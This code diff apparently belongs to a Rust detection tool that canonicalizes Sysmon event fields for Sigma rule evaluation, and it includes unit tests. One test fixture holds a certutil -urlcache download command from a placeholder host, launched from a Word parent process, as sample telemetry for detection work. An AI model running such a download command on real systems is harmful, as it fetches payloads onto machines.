@@ -35,14 +35,18 @@ pub enum Format {
 }
 
 /// One ingested telemetry record reduced to the analyzer's unit shape: the
-/// commands resolved from the event, plus the raw command line the sensor
-/// recorded. `record` is the 1-based position of the source record (used as the
-/// finding's line number, so a finding points back at the record it came from).
+/// commands resolved from the event, the raw command line the sensor recorded,
+/// and the full field map of the event (canonically named). `record` is the
+/// 1-based position of the source record (used as the finding's line number, so
+/// a finding points back at the record it came from). `event` carries the fields
+/// a command line can't supply — `ParentImage`, `User`, `IntegrityLevel`, … — so
+/// Sigma evaluation can resolve rules keyed on them against the real event.
 #[derive(Debug, Clone)]
 pub struct Observation {
     pub record: usize,
     pub commands: Vec<Command>,
     pub raw: String,
+    pub event: HashMap<String, String>,
 }
 
 /// The result of ingesting a telemetry file: the process-creation observations
@@ -72,6 +76,7 @@ fn parse_sysmon(text: &str) -> Result<Ingest, String> {
                 record: i + 1,
                 commands,
                 raw,
+                event: fields,
             }),
             None => skipped += 1,
         }
@@ -80,6 +85,45 @@ fn parse_sysmon(text: &str) -> Result<Ingest, String> {
         observations,
         skipped,
     })
+}
+
+/// Canonical Sysmon Event ID 1 field names. Ingested records arrive with varied
+/// casing and nesting; canonicalizing on the way in lets both the reduction and
+/// the Sigma evaluator address a field by the standard name a rule references
+/// (e.g. a `ParentImage|endswith` selection). Unrecognized keys are kept as-is.
+const SYSMON_FIELDS: &[&str] = &[
+    "EventID",
+    "Image",
+    "CommandLine",
+    "OriginalFileName",
+    "CurrentDirectory",
+    "User",
+    "IntegrityLevel",
+    "Hashes",
+    "Company",
+    "Description",
+    "Product",
+    "FileVersion",
+    "ParentImage",
+    "ParentCommandLine",
+    "ParentUser",
+    "ParentProcessId",
+    "ProcessId",
+    "LogonId",
+    "TerminalSessionId",
+];
+
+/// Map an incoming field key to its canonical Sysmon name (case-insensitively),
+/// normalizing the Elastic `winlog` `event_id` alias to `EventID`.
+fn canonical_field(key: &str) -> String {
+    if key.eq_ignore_ascii_case("event_id") {
+        return "EventID".to_string();
+    }
+    SYSMON_FIELDS
+        .iter()
+        .find(|f| key.eq_ignore_ascii_case(f))
+        .map(|f| f.to_string())
+        .unwrap_or_else(|| key.to_string())
 }
 
 /// Read a telemetry document into a flat list of event values, accepting the
@@ -118,13 +162,14 @@ fn read_events(text: &str) -> Result<Vec<Value>, String> {
     Ok(out)
 }
 
-/// Flatten an event object into a case-insensitive map of scalar fields,
-/// descending through the container objects different exporters wrap event data
-/// in (`EventData`, Elastic's `winlog.event_data`, an outer `Event`, …) and the
-/// EVTX→JSON `{ "@Name": "Image", "#text": "…" }` array shape. Top-level scalars
-/// win over nested ones, which is correct: flat Sysmon JSON carries the fields
-/// at the top level, and the nested shapes carry them only when the top level
-/// does not.
+/// Flatten an event object into a map of scalar fields keyed by canonical Sysmon
+/// field name, descending through the container objects different exporters wrap
+/// event data in (`EventData`, Elastic's `winlog.event_data`, an outer `Event`,
+/// …) and the EVTX→JSON `{ "@Name": "Image", "#text": "…" }` array shape.
+/// Top-level scalars win over nested ones, which is correct: flat Sysmon JSON
+/// carries the fields at the top level, and the nested shapes carry them only
+/// when the top level does not. Canonical names let the reduction and the Sigma
+/// evaluator address a field by the standard name a rule references.
 fn flatten_fields(ev: &Value) -> HashMap<String, String> {
     let mut out = HashMap::new();
     collect_scalars(ev, &mut out, 0);
@@ -146,7 +191,7 @@ fn collect_scalars(v: &Value, out: &mut HashMap<String, String>, depth: usize) {
     // a flat top-level field win over the same field nested in `EventData`.
     for (k, val) in map {
         if let Some(s) = value_scalar(val) {
-            out.entry(k.to_lowercase()).or_insert(s);
+            out.entry(canonical_field(k)).or_insert(s);
         }
     }
     for val in map.values() {
@@ -163,7 +208,7 @@ fn collect_scalars(v: &Value, out: &mut HashMap<String, String>, depth: usize) {
                     match (name, text) {
                         (Some(name), Some(text)) => {
                             if let Some(s) = value_scalar(text) {
-                                out.entry(name.to_lowercase()).or_insert(s);
+                                out.entry(canonical_field(name)).or_insert(s);
                             }
                         }
                         _ => collect_scalars(item, out, depth + 1),
@@ -193,8 +238,10 @@ fn value_scalar(v: &Value) -> Option<String> {
 /// network (EID 3) or file (EID 11) record, which carries an `Image` but no
 /// `CommandLine`, from being misread as a process launch.
 fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Command>, String)> {
-    let event_id = fields.get("eventid").or_else(|| fields.get("event_id"));
-    let command_line = fields.get("commandline").map(String::as_str).unwrap_or("");
+    // Fields are canonically named by `flatten_fields`, so the Sysmon standard
+    // names address them directly.
+    let event_id = fields.get("EventID");
+    let command_line = fields.get("CommandLine").map(String::as_str).unwrap_or("");
     let is_process_create = match event_id {
         Some(id) => id.trim() == "1",
         None => !command_line.trim().is_empty(),
@@ -203,7 +250,7 @@ fn reduce_process_create(fields: &HashMap<String, String>) -> Option<(Vec<Comman
         return None;
     }
 
-    let image = fields.get("image").map(String::as_str).unwrap_or("");
+    let image = fields.get("Image").map(String::as_str).unwrap_or("");
     // Prefer the recorded command line as the raw text; fall back to the image
     // path when a Process Create event carries no command line.
     let raw = if command_line.trim().is_empty() {
@@ -321,10 +368,10 @@ mod tests {
         // even with the event id stripped it must not be read as a process.
         let mut fields = HashMap::new();
         fields.insert(
-            "image".to_string(),
+            "Image".to_string(),
             "C:\\Windows\\System32\\svchost.exe".to_string(),
         );
-        fields.insert("destinationip".to_string(), "192.0.2.1".to_string());
+        fields.insert("DestinationIp".to_string(), "192.0.2.1".to_string());
         assert!(reduce_process_create(&fields).is_none());
     }
 
@@ -358,13 +405,37 @@ mod tests {
         let value: serde_json::Value = serde_json::from_str(ev).unwrap();
         let fields = flatten_fields(&value);
         assert_eq!(
-            fields.get("image").map(String::as_str),
+            fields.get("Image").map(String::as_str),
             Some("C:\\Windows\\System32\\certutil.exe")
         );
         // The nested-only field is still collected.
         assert_eq!(
-            fields.get("commandline").map(String::as_str),
+            fields.get("CommandLine").map(String::as_str),
             Some("reg query HKLM")
+        );
+    }
+
+    #[test]
+    fn observation_carries_canonical_event_fields() {
+        // The fields a command line can't supply are canonically named and kept
+        // on the observation, so Sigma evaluation can consult them. Casing and
+        // the Elastic `winlog` nesting are both normalized.
+        let ev = r#"{"winlog":{"event_id":1,"event_data":{
+            "Image":"C:\\Windows\\System32\\certutil.exe",
+            "CommandLine":"certutil -urlcache -f http://x/a a",
+            "parentimage":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
+            "IntegrityLevel":"Medium"
+        }}}"#;
+        let ingest = parse(ev, Format::Sysmon).expect("parses");
+        let event = &ingest.observations[0].event;
+        assert_eq!(event.get("EventID").map(String::as_str), Some("1"));
+        assert_eq!(
+            event.get("ParentImage").map(String::as_str),
+            Some("C:\\Program Files\\Microsoft Office\\WINWORD.EXE")
+        );
+        assert_eq!(
+            event.get("IntegrityLevel").map(String::as_str),
+            Some("Medium")
         );
     }
 
